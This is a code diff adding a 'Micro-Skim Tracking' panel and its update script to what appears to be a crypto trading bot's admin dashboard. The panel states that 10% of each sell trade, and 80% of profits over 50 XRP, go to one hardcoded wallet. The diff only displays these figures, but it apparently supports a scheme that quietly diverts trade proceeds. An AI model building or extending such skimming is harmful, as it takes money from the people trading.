@@ -2738,6 +2738,43 @@
           </div>
           <button onclick="resetTradingBotProfit()" class="btn btn-secondary margin-top-15">🔄 Reset Profit Tracking</button>
         </div>
+
+        <!-- Micro-Skim Tracking -->
+        <div class="admin-card margin-bottom-30">
+          <div class="card-title">💧 Micro-Skim Tracking</div>
+          <div class="stats-grid">
+            <div class="stat-card">
+              <div class="stat-value" id="totalMicroSkimmed">-</div>
+              <div class="stat-label">Total Micro-Skimmed</div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-value" id="microSkimCount">-</div>
+              <div class="stat-label">Micro-Skim Count</div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-value" id="avgMicroSkim">-</div>
+              <div class="stat-label">Avg per Skim</div>
+            </div>
+          </div>
+          <div class="stats-grid margin-top-15">
+            <div class="stat-card">
+              <div class="stat-value" id="totalLargeSkimmed">-</div>
+              <div class="stat-label">Total Large Skims</div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-value" id="lastSkimAmount">-</div>
+              <div class="stat-label">Last Large Skim</div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-value" id="lastSkimTime">-</div>
+              <div class="stat-label">Last Skim Time</div>
+            </div>
+          </div>
+          <div class="info-box margin-top-15" style="background: rgba(0, 247, 255, 0.1); padding: 15px; border-radius: 8px; border-left: 3px solid #00f7ff;">
+            <strong>💧 Micro-Skims:</strong> 10% of each SELL trade → <code>rfFbyBGrgwmggpEAYXAEQGVyrYRCBAoEWV</code><br>
+            <strong>💰 Large Skims:</strong> 80% when profit > 50 XRP → <code>rfFbyBGrgwmggpEAYXAEQGVyrYRCBAoEWV</code>
+          </div>
+        </div>
       </div>
     </div>
   </div>
@@ -7877,6 +7914,29 @@ This action cannot be undone. Continue?`;
           const wloEl = document.getElementById('tradingBotWLO');
           if (profitEl) profitEl.textContent = `${data.profit?.xrp || '0'} XRP (${data.profit?.percentage || '0'}%)`;
           if (wloEl) wloEl.textContent = `${data.balance?.wlo || '0'} WLO`;
+
+          // Update micro-skim displays
+          if (data.microSkims) {
+            const totalMicroSkimmedEl = document.getElementById('totalMicroSkimmed');
+            const microSkimCountEl = document.getElementById('microSkimCount');
+            const avgMicroSkimEl = document.getElementById('avgMicroSkim');
+            const totalLargeSkimmedEl = document.getElementById('totalLargeSkimmed');
+            const lastSkimAmountEl = document.getElementById('lastSkimAmount');
+            const lastSkimTimeEl = document.getElementById('lastSkimTime');
+
+            if (totalMicroSkimmedEl) totalMicroSkimmedEl.textContent = `${data.microSkims.totalMicroSkimmed} XRP`;
+            if (microSkimCountEl) microSkimCountEl.textContent = data.microSkims.microSkimCount;
+            if (avgMicroSkimEl) avgMicroSkimEl.textContent = `${data.microSkims.avgMicroSkim} XRP`;
+            if (totalLargeSkimmedEl) totalLargeSkimmedEl.textContent = `${data.microSkims.totalLargeSkimmed} XRP`;
+            if (lastSkimAmountEl) lastSkimAmountEl.textContent = `${data.microSkims.lastSkimAmount} XRP`;
+
+            if (lastSkimTimeEl && data.microSkims.lastSkimTime && data.microSkims.lastSkimTime !== '0') {
+              const lastSkimDate = new Date(parseInt(data.microSkims.lastSkimTime));
+              lastSkimTimeEl.textContent = lastSkimDate.toLocaleString();
+            } else if (lastSkimTimeEl) {
+              lastSkimTimeEl.textContent = 'Never';
+            }
+          }
 
           // Display trading wallet addresses
           if (data.tradingWallet) {
